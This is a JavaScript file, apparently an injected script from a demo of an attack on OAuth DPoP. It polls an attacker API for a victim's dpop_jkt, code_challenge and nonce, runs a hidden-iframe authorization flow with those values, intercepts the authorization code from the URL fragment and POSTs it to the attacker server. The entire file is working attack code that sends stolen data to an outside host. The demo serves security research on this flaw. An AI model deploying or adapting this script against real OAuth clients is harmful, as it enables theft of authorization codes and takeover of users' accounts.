// Malicious JavaScript for OAuth DPoP Attack Demo
// This is a PORTABLE version that works with any OAuth client
(function() {
    const ATTACKER_API = 'https://localhost:7666';
    const POLL_INTERVAL = 2000;
    let attackerSessionId = null;
    let stolenDpopJkt = null;
    let stolenCodeChallenge = null;
    let stolenNonce = null;
    let stolenClientId = null;
    let stolenRedirectUri = null;
    let stolenScope = null;
    let stolenState = null;
    
    function log(message) {
        console.log('[MALICIOUS JS]', message);
        const indicator = document.getElementById('attack-indicator');
        const status = document.getElementById('attack-status');
        if (indicator && status) {
            indicator.style.display = 'block';
            status.textContent = message;
        }
    }
    
    async function pollForDpopJkt() {
        try {
            const response = await fetch(`${ATTACKER_API}/api/attack/dpop/latest`);
            if (response.ok) {
                const data = await response.json();
                console.log('[VICTIM] Received DPoP data:', data);
                log(`Found dpop_jkt from attacker! Session: ${data.sessionId}`);
                
                attackerSessionId = data.sessionId;
                
                // Try both camelCase and PascalCase property names
                stolenDpopJkt = data.dpopProof || data.dPoPProof || data.DPoPProof;
                stolenCodeChallenge = data.codeChallenge || data.CodeChallenge;
                stolenNonce = data.nonce || data.Nonce;
                
                // Try to extract additional parameters from the URL if available
                // These might be stored by the attacker in the data object
                stolenClientId = data.clientId || data.ClientId;
                stolenRedirectUri = data.redirectUri || data.RedirectUri;
                stolenScope = data.scope || data.Scope;
                stolenState = data.state || data.State;
                
                if (!stolenDpopJkt) {
                    console.error('[VICTIM] Could not find dpop_jkt in response:', data);
                    log('ERROR: dpop_jkt not found in API response!');
                    return;
                }
                
                if (!stolenCodeChallenge) {
                    console.error('[VICTIM] Could not find code_challenge in response:', data);
                    log('ERROR: code_challenge not found in API response!');
                    return;
                }
                
                if (!stolenNonce) {
                    console.error('[VICTIM] Could not find nonce in response:', data);
                    log('ERROR: nonce not found in API response!');
                    return;
                }
                
                log(`Stolen dpop_jkt: ${stolenDpopJkt}`);
                log(`Stolen code_challenge: ${stolenCodeChallenge.substring(0, 20)}...`);
                log(`Stolen nonce: ${stolenNonce.substring(0, 20)}...`);
                
                // Stop polling and start the silent OAuth flow
                clearInterval(pollInterval);
                startSilentOAuthFlow();
            }
        } catch (error) {
            // Continue polling silently
        }
    }
    
    // Detect OAuth configuration from current page
    function detectOAuthConfig() {
        // Try to detect from current URL or page context
        const config = {
            authorizeEndpoint: 'https://localhost:5001/connect/authorize',
            clientId: 'dpop',
            redirectUri: 'https://localhost:5010/signin-oidc',
            scope: 'openid profile scope1 offline_access'
        };
        
        // Try to detect from meta tags (if the app provides them)
        const metaAuthEndpoint = document.querySelector('meta[name="oauth-authorize-endpoint"]');
        if (metaAuthEndpoint) {
            config.authorizeEndpoint = metaAuthEndpoint.content;
        }
        
        const metaClientId = document.querySelector('meta[name="oauth-client-id"]');
        if (metaClientId) {
            config.clientId = metaClientId.content;
        }
        
        const metaRedirectUri = document.querySelector('meta[name="oauth-redirect-uri"]');
        if (metaRedirectUri) {
            config.redirectUri = metaRedirectUri.content;
        }
        
        // Override with stolen values if available
        if (stolenClientId) config.clientId = stolenClientId;
        if (stolenRedirectUri) config.redirectUri = stolenRedirectUri;
        if (stolenScope) config.scope = stolenScope;
        
        return config;
    }
    
    // Start silent OAuth flow in hidden iframe
    async function startSilentOAuthFlow() {
        log('Starting silent OAuth flow with stolen dpop_jkt and code_challenge...');
        
        const config = detectOAuthConfig();
        
        // Build authorize URL with stolen dpop_jkt and code_challenge, and response_mode=fragment
        const authorizeUrl = new URL(config.authorizeEndpoint);
        authorizeUrl.searchParams.set('client_id', config.clientId);
        authorizeUrl.searchParams.set('redirect_uri', config.redirectUri);
        authorizeUrl.searchParams.set('response_type', 'code');
        authorizeUrl.searchParams.set('scope', config.scope);
        authorizeUrl.searchParams.set('response_mode', 'fragment'); // Critical: keeps code in fragment
        authorizeUrl.searchParams.set('dpop_jkt', stolenDpopJkt);
        authorizeUrl.searchParams.set('state', stolenState || 'malicious_state_' + Math.random().toString(36).substring(7));
        authorizeUrl.searchParams.set('code_challenge', stolenCodeChallenge);
        authorizeUrl.searchParams.set('code_challenge_method', 'S256');
        authorizeUrl.searchParams.set('nonce', stolenNonce);
        
        log(`Using authorize endpoint: ${config.authorizeEndpoint}`);
        log(`Using client_id: ${config.clientId}`);
        log(`Using redirect_uri: ${config.redirectUri}`);
        
        // Create hidden iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.id = 'attack-iframe';
        
        // Monitor iframe for redirect with authorization code
        iframe.onload = function() {
            try {
                const iframeUrl = iframe.contentWindow.location.href;
                log('Iframe loaded: ' + iframeUrl);
                
                // Check if we got redirected to the redirect_uri with code in fragment
                if (iframeUrl.includes(config.redirectUri) && iframeUrl.includes('#')) {
                    const fragment = iframeUrl.split('#')[1];
                    const params = new URLSearchParams(fragment);
                    const code = params.get('code');
                    const state = params.get('state');
                    
                    if (code) {
                        log('✅ Intercepted authorization code: ' + code.substring(0, 20) + '...');
                        
                        // Stop the iframe from processing further
                        try {
                            iframe.contentWindow.stop();
                        } catch (e) {
                            // Might fail due to cross-origin, that's ok
                        }
                        
                        // Exfiltrate the code
                        exfiltrateCode(code, state);
                        
                        // Clean up
                        try {
                            document.body.removeChild(iframe);
                        } catch (e) {
                            // Already removed
                        }
                    }
                }
            } catch (e) {
                // Cross-origin error - expected when on different domain
                // This is actually good for the attack - it means we're on the authorize endpoint
                log('Cross-origin access (expected during OAuth flow)');
            }
        };
        
        iframe.src = authorizeUrl.toString();
        document.body.appendChild(iframe);
        
        log('Hidden iframe created with authorize URL');
    }
    
    // Send stolen code to attacker API
    async function exfiltrateCode(code, state) {
        try {
            // We don't need to send the code_verifier because the attacker already has it!
            // They generated the code_challenge, so they have the matching code_verifier
            
            const response = await fetch(`${ATTACKER_API}/api/attack/code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: attackerSessionId,
                    code: code,
                    state: state,
                    codeVerifier: null, // Attacker already has this
                    issuerUrl: new URL(detectOAuthConfig().authorizeEndpoint).origin
                })
            });
            
            if (response.ok) {
                log('✅ Successfully sent authorization code to attacker!');
                log('⚠️ Attack complete! The attacker can now complete the OAuth flow.');
            } else {
                log('❌ Failed to send code to attacker: ' + response.status);
            }
        } catch (error) {
            log('❌ Error sending code: ' + error.message);
        }
    }
    
    // Start polling when page loads
    log('Malicious script loaded. Polling for dpop_jkt...');
    const pollInterval = setInterval(pollForDpopJkt, POLL_INTERVAL);
    
    // Also check immediately
    pollForDpopJkt();
})();
